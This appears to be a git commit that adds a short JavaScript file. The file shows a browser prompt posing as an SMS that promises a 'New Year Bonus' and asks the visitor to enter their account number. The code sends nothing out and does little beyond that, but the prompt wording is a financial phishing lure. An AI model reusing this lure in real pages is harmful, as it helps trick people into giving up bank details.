a585ffc8a3f494b118782f56ecb7555e5443b381
help0z <triplerain29@gmail.com>
2025-12-30 02:17:15 +0100

    Create active-xmas.js

---
+++ active-xmas.js
@@ -0,0 +1,9 @@
+  
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive New Year Bonus. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = '#';
+}
